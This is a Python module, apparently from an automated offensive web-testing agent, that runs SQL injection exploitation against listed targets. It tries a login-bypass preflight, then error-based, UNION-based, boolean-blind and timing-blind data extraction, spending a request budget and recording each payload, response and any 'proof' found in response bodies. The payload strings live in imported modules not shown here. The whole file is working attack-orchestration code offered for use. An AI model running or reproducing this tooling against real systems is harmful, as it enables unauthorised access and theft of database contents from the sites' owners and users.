from __future__ import annotations

from .auth_flow import AuthFlowMixin
from .blind import BlindExtractionMixin
from .error_based import ErrorBasedMixin
from .union_based import UnionBasedMixin

from ravage.agent_core.agent_state import AgentState
from ravage.runtime.common import clip
from ravage.web_core.http_probe import ProbeResponse, ProbeSession
from ravage.web_core.proof_recognizer import recognize_proofs

from .auth import _login_targets
from .models import (
    AUTH_BYPASS_PREFLIGHT_BUDGET,
    BaselineValue,
    BriefTarget,
    ReplayTarget,
    SendTarget,
    SqliExploitRun,
    UNION_RESERVE_BUDGET,
)
from .sql_helpers import _target_looks_primary_public_query, _timing_signal_confirmed

def run_sqli_exploit(  # noqa: PLR0913
    *,
    session: ProbeSession,
    state: AgentState,
    targets: list[dict[str, object]],
    send_target: SendTarget,
    target_brief: BriefTarget,
    replay_target: ReplayTarget,
    baseline_value: BaselineValue,
    request_budget: int = 260,
) -> SqliExploitRun:
    runner = _Extractor(
        session=session,
        state=state,
        targets=targets[:18],
        send_target=send_target,
        target_brief=target_brief,
        replay_target=replay_target,
        baseline_value=baseline_value,
        request_budget=request_budget,
    )
    return runner.run()


class _Extractor(ErrorBasedMixin, UnionBasedMixin, BlindExtractionMixin, AuthFlowMixin):
    def __init__(  # noqa: PLR0913
        self,
        *,
        session: ProbeSession,
        state: AgentState,
        targets: list[dict[str, object]],
        send_target: SendTarget,
        target_brief: BriefTarget,
        replay_target: ReplayTarget,
        baseline_value: BaselineValue,
        request_budget: int,
    ) -> None:
        self.session = session
        self.state = state
        self.targets = targets
        self.send_target = send_target
        self.target_brief = target_brief
        self.replay_target = replay_target
        self.baseline_value = baseline_value
        self.budget = request_budget
        self.requests: list[dict[str, object]] = []
        self.findings: list[dict[str, object]] = []
        self.errors: list[str] = []
        self.proofs: list[str] = []
        self._timing_confirmed = _timing_signal_confirmed(state)
        self._timing_attempted = False
        self._timing_stop = False
        self._timing_deadline = 0.0

    def run(self) -> SqliExploitRun:
        if self._should_try_auth_bypass_preflight():
            self._try_sqli_auth_bypass(
                [],
                include_fallback=False,
                max_requests=AUTH_BYPASS_PREFLIGHT_BUDGET,
                reserve_budget=UNION_RESERVE_BUDGET,
            )
        if self.proofs or self.budget <= 0:
            return self._result()

        for target in self.targets:
            primitive = self._find_error_primitive(target)
            if primitive:
                self._extract_error_based(primitive)
                if self.proofs or self.budget <= 0:
                    return self._result()

            # Try visible UNION extraction before blind loops. This matches the
            # SQLMap/AWE-style flow: once a sink is confirmed, prefer direct data
            # extraction before spending the remaining budget on character oracles.
            if self.budget > UNION_RESERVE_BUDGET:
                union_primitive = self._find_union_primitive(target)
                if union_primitive:
                    self._extract_union_based(union_primitive)
                    if self.proofs or self.budget <= 0:
                        return self._result()

            boolean_primitive = self._find_boolean_primitive(target)
            if boolean_primitive:
                self._extract_boolean_blind(boolean_primitive)
                if self.proofs or self.budget <= 0:
                    return self._result()
            elif self._timing_confirmed and not self._timing_attempted:
                self._timing_attempted = True
                timing_primitive = self._find_timing_primitive(target)
                if timing_primitive:
                    self._extract_timing_blind(timing_primitive)
                    if self.proofs or self.budget <= 0:
                        return self._result()
        return self._result()

    def _should_try_auth_bypass_preflight(self) -> bool:
        login_targets = _login_targets(self.state, self.session, include_fallback=False)
        if not login_targets:
            return False

        primary_targets = self.targets[:6]
        for target in primary_targets:
            if _target_looks_primary_public_query(target):
                return False

        return True

    def _result(self) -> SqliExploitRun:
        phases: set[str] = set()
        for finding in self.findings:
            phase = finding.get("phase")
            if phase:
                phases.add(str(phase))

        phase_text = ",".join(sorted(phases))
        if not phase_text:
            phase_text = "none"

        summary = (
            f"SQLi exploit phases={phase_text}, "
            f"findings={len(self.findings)}, proofs={len(self.proofs)}, "
            f"requests={len(self.requests)}, budget_remaining={self.budget}"
        )

        return SqliExploitRun(
            ok=bool(self.findings or self.proofs),
            summary=summary,
            findings=self.findings[:80],
            requests=self.requests[:120],
            errors=self.errors[:20],
        )

    def _send(self, target: dict[str, object], payload: str, *, phase: str, expr: str = "") -> ProbeResponse | None:
        if self.budget <= 0:
            return None
        if phase in {"error_probe", "error_extract", "union_probe", "union_extract"} and self.budget <= UNION_RESERVE_BUDGET:
            return None
        self.budget -= 1
        response = self.send_target(target, payload)
        self._record_response(response, target=target, phase=phase, payload=payload, expr=expr)
        return response

    def _record_response(
        self,
        response: ProbeResponse,
        *,
        target: dict[str, object],
        phase: str,
        payload: str,
        expr: str,
    ) -> None:
        self.requests.append(
            response.summary(body_chars=180)
            | {
                "phase": phase,
                "target": self.target_brief(target),
                "payload": clip(payload, 220),
                "expr": clip(expr, 180),
            }
        )
        for proof in recognize_proofs(response.body):
            if proof not in self.proofs:
                self.proofs.append(proof)
                self.findings.append(
                    {
                        "type": "sql_extracted_proof",
                        "phase": phase,
                        "proof": proof,
                        "target": self.target_brief(target),
                        "response": response.summary(body_chars=260),
                    }
                )
